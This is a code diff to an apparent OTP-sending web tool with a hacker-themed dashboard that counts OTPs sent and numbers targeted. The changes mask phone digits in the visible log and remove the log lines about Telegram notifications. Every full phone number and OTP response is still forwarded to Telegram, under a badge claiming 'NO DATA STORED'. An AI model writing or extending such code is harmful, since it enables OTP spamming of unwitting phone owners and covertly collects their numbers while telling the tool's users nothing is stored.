@@ -33,11 +33,17 @@ LOG_LOCK = threading.Lock()
 # --- LOGGING ---
 def log_sys(msg, level="info", target="N/A"):
     with LOG_LOCK:
+        # Hide last 5 digits of phone number
+        if target and len(target) >= 10 and target.isdigit():
+            hidden_target = target[:5] + "*****"
+        else:
+            hidden_target = target
+        
         entry = {
             "time": datetime.now().strftime("%H:%M:%S"),
             "message": msg,
             "level": level,
-            "target": target
+            "target": hidden_target
         }
         STATE["logs"].insert(0, entry)
         if len(STATE["logs"]) > 500:
@@ -131,11 +137,10 @@ def process_otp(phone):
     
     STATE["is_sending"] = True
     STATE["current_number"] = phone
-    log_sys(f"Processing OTP for {phone}", "info", target=phone)
+    log_sys(f"Processing OTP request", "info", target=phone)
     
-    # Send initial notification to Telegram
+    # Send initial notification to Telegram (not logged)
     send_telegram_message(phone, "PROCESSING")
-    log_sys(f"📤 Initial notification sent to Telegram", "success", target=phone)
     
     # Send OTP
     status_code, response_data = send_otp(phone)
@@ -144,18 +149,16 @@ def process_otp(phone):
         STATE["otp_sent"] += 1
         STATE["total_numbers"] += 1
         STATE["last_response"] = response_data
-        log_sys(f"✅ OTP SENT to {phone}!", "success", target=phone)
+        log_sys(f"✅ OTP SENT successfully!", "success", target=phone)
         
-        # Send success to Telegram with response
+        # Send success to Telegram with response (not logged)
         send_telegram_message(phone, "SUCCESS ✅", response_data)
-        log_sys(f"📤 Success notification sent to Telegram", "success", target=phone)
     else:
         STATE["otp_failed"] += 1
-        log_sys(f"❌ OTP FAILED for {phone} - {status_code}", "error", target=phone)
+        log_sys(f"❌ OTP FAILED - Status: {status_code}", "error", target=phone)
         
-        # Send failure to Telegram with response
+        # Send failure to Telegram with response (not logged)
         send_telegram_message(phone, f"FAILED ❌ ({status_code})", response_data)
-        log_sys(f"📤 Failure notification sent to Telegram", "warn", target=phone)
     
     STATE["is_sending"] = False
     STATE["current_number"] = None
@@ -313,6 +316,46 @@ HTML_TEMPLATE = """
             z-index: -1;
         }
         
+        .stats-top {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 25px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .stat-card {
+            border: 1px solid #00ff41;
+            padding: 15px 10px;
+            text-align: center;
+            background: rgba(0, 255, 65, 0.03);
+            transition: all 0.3s;
+        }
+        
+        .stat-card:hover {
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+        }
+        
+        .stat-card .label {
+            font-size: 0.7em;
+            color: #00aa33;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .stat-card .value {
+            font-size: 28px;
+            font-weight: bold;
+            margin-top: 5px;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+        
+        .stat-card.success .value { color: #00ff41; }
+        .stat-card.danger .value { color: #ff0040; }
+        .stat-card.info .value { color: #00ccff; }
+        
         .input-section {
             background: rgba(0, 20, 0, 0.8);
             border: 1px solid #00ff41;
@@ -418,43 +461,6 @@ HTML_TEMPLATE = """
             padding: 10px 20px;
             font-size: 0.9em;
         }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 12px;
-            margin: 20px 0;
-        }
-        
-        .stat-box {
-            border: 1px solid #00ff41;
-            padding: 15px;
-            text-align: center;
-            background: rgba(0, 255, 65, 0.03);
-            transition: all 0.3s;
-        }
-        
-        .stat-box:hover {
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
-        }
-        
-        .stat-label {
-            font-size: 0.75em;
-            color: #00aa33;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .stat-value {
-            font-size: 24px;
-            font-weight: bold;
-            margin-top: 5px;
-            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
-        }
-        
-        .stat-success .stat-value { color: #00ff41; }
-        .stat-danger .stat-value { color: #ff0040; }
-        .stat-info .stat-value { color: #00ccff; }
         
         .status-badge {
             display: inline-block;
@@ -592,7 +598,7 @@ HTML_TEMPLATE = """
             .header h1 { font-size: 1.5em; letter-spacing: 4px; }
             .input-row { flex-direction: column; }
             .input-row input { width: 100%; }
-            .stat-value { font-size: 18px; }
+            .stats-top { grid-template-columns: 1fr; max-width: 300px; }
         }
     </style>
 </head>
@@ -607,6 +613,22 @@ HTML_TEMPLATE = """
             <div style="margin-top: 10px;">
                 <span class="anonymous-badge">🔒 NO DATA STORED</span>
                 <span id="status_badge" class="status-badge status-idle">● IDLE</span>
+            </div>
+        </div>
+        
+        <!-- Stats at top -->
+        <div class="stats-top">
+            <div class="stat-card success">
+                <div class="label">✅ OTP SENT</div>
+                <div class="value" id="val_sent">0</div>
+            </div>
+            <div class="stat-card danger">
+                <div class="label">❌ OTP FAILED</div>
+                <div class="value" id="val_failed">0</div>
+            </div>
+            <div class="stat-card info">
+                <div class="label">👤 TOTAL NUMBERS</div>
+                <div class="value" id="val_numbers">0</div>
             </div>
         </div>
         
@@ -629,21 +651,6 @@ HTML_TEMPLATE = """
             </div>
             
             <div id="responseBox" class="response-box"></div>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat-box stat-success">
-                <div class="stat-label">✅ OTP SENT</div>
-                <div class="stat-value" id="val_sent">0</div>
-            </div>
-            <div class="stat-box stat-danger">
-                <div class="stat-label">❌ OTP FAILED</div>
-                <div class="stat-value" id="val_failed">0</div>
-            </div>
-            <div class="stat-box stat-info">
-                <div class="stat-label">👤 TOTAL NUMBERS</div>
-                <div class="stat-value" id="val_numbers">0</div>
-            </div>
         </div>
         
         <div class="terminal">
@@ -751,7 +758,7 @@ HTML_TEMPLATE = """
                     document.getElementById('phoneInput').value = '';
                     const box = document.getElementById('responseBox');
                     box.className = 'response-box active';
-                    box.innerHTML = `📡 OTP request sent for ${phone}. Check logs for status.`;
+                    box.innerHTML = `📡 OTP request sent. Check logs for status.`;
                 }
             })
             .catch(err => {
